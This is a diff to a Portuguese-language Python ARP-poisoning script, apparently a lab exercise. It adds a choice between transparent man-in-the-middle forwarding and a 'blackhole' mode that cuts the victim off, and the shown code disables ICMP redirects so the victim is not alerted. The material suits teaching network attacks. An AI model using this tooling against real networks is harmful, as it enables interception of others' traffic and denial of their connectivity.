@@ -112,6 +112,32 @@ def escolher_alvos(hosts, args):
     return v["ip"], v["mac"], g["ip"], g["mac"]
 
 
+def decidir_encaminhamento(args):
+    """Decide se o atacante vai ENCAMINHAR (MITM transparente) ou nao (blackhole).
+
+    Prioridade: as flags explicitas vencem (`--forward` / `--sem-forward`). Sem
+    flag e com terminal interativo, pergunta ao usuario (padrao: encaminhar).
+    Sem terminal (saida redirecionada/script), encaminha -- o comportamento
+    transparente padrao. Retornar False e o Experimento 3 (ip_forward=0).
+    """
+    if args.forward and args.sem_forward:
+        sys.exit("Use apenas um entre --forward e --sem-forward.")
+    if args.sem_forward:
+        return False
+    if args.forward:
+        return True
+    if not sys.stdin.isatty():
+        return True
+    try:
+        resp = input("\nEncaminhar os pacotes da vitima (MITM transparente)?\n"
+                     "  [S] sim  -> interceptacao transparente, vitima navega normal\n"
+                     "  [n] nao  -> blackhole (Experimento 3), vitima perde conexao\n"
+                     "Escolha [S]: ").strip().lower()
+    except EOFError:
+        return True
+    return resp not in ("n", "nao", "nAo", "não", "no")
+
+
 # ---- Threads ----------------------------------------------------------------
 def laco_envenenador(sock_envio, meu_mac, vitima, mac_vitima, gateway,
                      mac_gateway, intervalo, estado, parar):
@@ -178,8 +204,10 @@ def main():
                    help="duracao da varredura ARP de descoberta (padrao 3s)")
     p.add_argument("--dir-saida", default="resultados",
                    help="diretorio dos arquivos de log/resumo")
+    p.add_argument("--forward", action="store_true",
+                   help="forcar ip_forward=1 (MITM transparente) sem perguntar")
     p.add_argument("--sem-forward", action="store_true",
-                   help="NAO ativar ip_forward (demonstra o blackhole do Experimento 3)")
+                   help="forcar ip_forward=0 (blackhole do Experimento 3) sem perguntar")
     args = p.parse_args()
 
     if not hasattr(socket, "AF_PACKET"):
@@ -217,6 +245,9 @@ def main():
     print(f"[*] VITIMA  {vitima} -> {mac_vitima}")
     print(f"[*] GATEWAY {gateway} -> {mac_gateway}")
 
+    # Pergunta (ou le das flags) se o atacante deve encaminhar os pacotes.
+    encaminhar = decidir_encaminhamento(args)
+
     # 3) Ajustes de kernel: ip_forward + desligar ICMP redirects (restaurados
     #    no encerramento). Os redirects, se ligados, avisariam a vitima da rota
     #    real e desfariam o ataque.
@@ -224,7 +255,7 @@ def main():
     for caminho in ("/proc/sys/net/ipv4/conf/all/send_redirects",
                     f"/proc/sys/net/ipv4/conf/{args.iface}/send_redirects"):
         sysctls.aplicar(caminho, 0)
-    if args.sem_forward:
+    if not encaminhar:
         sysctls.aplicar(CAMINHO_IP_FORWARD, 0)
         print("[!] ip_forward=0 (modo blackhole: a vitima perde conectividade)")
     else:
